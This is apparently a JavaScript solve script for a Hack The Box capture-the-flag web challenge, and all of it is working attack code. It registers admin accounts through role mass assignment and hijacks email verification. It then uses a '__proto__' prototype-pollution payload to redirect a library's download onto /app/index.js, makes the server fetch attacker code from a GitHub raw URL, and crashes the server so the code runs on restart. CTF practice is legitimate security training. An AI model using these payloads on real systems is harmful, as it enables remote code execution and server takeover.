const email = `${Math.random()}@interstellar.htb`;
const password = "a";

console.log({ email, password });

const urlWebapp = "http://localhost:1337";
const urlEmail = "http://localhost:8080";

// const urlWebapp = "http://94.237.54.116:40222";
// const urlEmail = "http://94.237.54.116:55487";

// Register admin account
console.log(await fetch(`${urlWebapp}/api/register`, {
  "headers": {
    "content-type": "application/json",
  },
  "body": JSON.stringify({ email, password, role: "admin" }),
  "method": "POST",
}).then(res => res.text()));

// Register stage 2 account for later
console.log(await fetch(`${urlWebapp}/api/register`, {
  "headers": {
    "content-type": "application/json",
  },
  "body": JSON.stringify({ email: "stage.2." + email, password, role: "admin" }),
  "method": "POST",
}).then(res => res.text()));

while (true) {
  // Send verification email to our email
  console.log(await fetch(`${urlWebapp}/api/sendEmail`, {
    "headers": {
      "content-type": "application/json",
    },
    "body": JSON.stringify({ "email": [email,"test@email.htb"] }),
    "method": "POST",
  }).then(res => res.text()));

  // Get the verification code from the email
  let code = await fetch(`${urlEmail}/`).then(res => res.text()).then(html => {
    const code = html.match(/Your verification code is: (\S+)/)?.[1];
    return code;
  });
  console.log("Code:", code);

  const res = await fetch(`${urlWebapp}/api/verify`, {
    "headers": {
      "content-type": "application/json",
    },
    "body": JSON.stringify({ email, code }),
    "method": "POST",
  }).then(res => res.json());
  console.log(res);

  // Sometimes the code is invalid, so we need to try again
  if (res.message === "Account verified successfully") {
    break;
  }

  // Delete all emails so the regex finds the correct code
  console.log(await fetch(`${urlEmail}/deleteall`).then(res => res.statusText));
}

const login = await fetch(`${urlWebapp}/api/login`, {
  "headers": {
    "content-type": "application/json",
  },
  "body": JSON.stringify({ email, password }),
  "method": "POST",
}).then(res => res.json());
console.log(login);

const proto = {
  output: "/app/index.js", // https://www.npmjs.com/package/needle/v/1.2.0#response-options
}

console.log(await fetch(`${urlWebapp}/api/bounties/1`, {
  "headers": {
    "Content-Type": "application/json",
    "Cookie": `auth=${login.token}`,
  },
  "body": `{
    "target_name": "balls ${new Date()}",
    "__proto__": ${JSON.stringify(proto)}
  }`,
  "method": "PUT",
}).then(res => res.json()));

console.log(await fetch(`${urlWebapp}/api/transmit`, {
  "headers": {
    "content-type": "application/json",
    "Cookie": `auth=${login.token}`,
  },
  "body": JSON.stringify({ url: "https://raw.githubusercontent.com/vladpopescu0/ctf/refs/heads/main/ex.js" }),
  "method": "POST",
}).then(res => res.text()));

// Crash and restart the server
try {
  console.log(await fetch(`${urlWebapp}/api/transmit`, {
    "headers": {
      "content-type": "application/json",
      "Cookie": `auth=${login.token}`,
    },
    "body": JSON.stringify({ url: "https://\x00" }),
    "method": "POST",
  }).then(res => res.text()));
} catch {
  console.log("Server crashed successfully");
}

await new Promise(resolve => setTimeout(resolve, 4000));

console.log(await fetch(`${urlWebapp}/static/js/flag.txt`, {
  "headers": {
    "Cookie": `auth=${login.token}`,
  },
}).then(res => res.text())); // HTB{f1nd1ng_0d4y_15_345Y_r1gh7!!?_25effb3162f657729f6933b025ecabf0}

export {}; // Make this a module